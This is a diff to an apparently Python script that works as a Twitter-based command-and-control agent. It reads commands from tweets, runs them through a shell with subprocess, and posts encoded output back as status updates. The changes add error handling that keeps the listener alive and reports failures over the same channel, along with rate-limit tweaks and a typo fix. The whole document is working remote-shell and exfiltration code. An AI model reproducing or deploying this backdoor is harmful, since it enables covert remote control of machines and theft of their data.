@@ -35,16 +35,18 @@ def limit():
 	if (len(value) == 55):
 		almost = value[-3:]
 		remain= almost[:2]
-		print str(remain) + " API calls remaining" 
+		real = (int(remain) -4)
+		print str(real) + " API calls remaining" 
 		if( int(remain) == 4):
-			print "Sleeping for 15 minutes. Maually delete tweets from Twitter pages."
+			print "Sleeping for 15 minutes. Manually delete tweets from Twitter pages."
 			sleep(15*61)
 	else:
 		almost = value[-4:]
 		remain= almost[:3]
-		print str(remain) + " API calls remaining" 
+		real = (int(remain) -4)
+		print str(real) + " API calls remaining" 
 		if( int(remain) == 4):
-			print "Sleeping for 15 minutes. Maually delete tweets from Twitter pages."
+			print "Sleeping for 15 minutes. Manually delete tweets from Twitter pages."
 			sleep(15*61)	
 
 
@@ -65,13 +67,29 @@ def listen():
 				 
 				#work on cd command here
 				if mess[:2] == "cd":
-					os.chdir(mess[3:])
-					print "Directory changed."
-					result = "Directory Changed." 
-					enResult = encode(result)
-					apiTwo.update_status(enResult)
+					try:
+						os.chdir(mess[3:])
+						print "Directory changed."
+						result = "Directory Changed." 
+						enResult = encode(result)
+						apiTwo.update_status(enResult)
+					except:
+    							print("Unexpected error:", sys.exc_info()[0])
+    							result = "Error. Invalid directory."
+    							enResult = encode(result)
+							apiTwo.update_status(enResult)
+    							listen()
+    							raise	
 				else:
-					response = subprocess.check_output(mess, shell=True)
+					try:
+						response = subprocess.check_output(mess, shell=True)
+					except:
+    						print("Unexpected error:", sys.exc_info()[0])
+    						result = "Error. Invalid command entered."
+    						enResult = encode(result)
+						apiTwo.update_status(enResult)
+    						listen()
+    						raise	
 					if (len(response) >= 47):
 						cutResp = response[:46] + '*'
 						enResponse = encode(cutResp)
@@ -114,9 +132,12 @@ def listen():
 if __name__ == "__main__":
 	try:	
 		listen() 
-		
+		#limit()
 	except:
     		print("Unexpected error:", sys.exc_info()[0])
+    		result = "Error. Invalid command entered."
+    		enResult = encode(result)
+		apiTwo.update_status(enResult)
     		listen()
     		raise	
 	
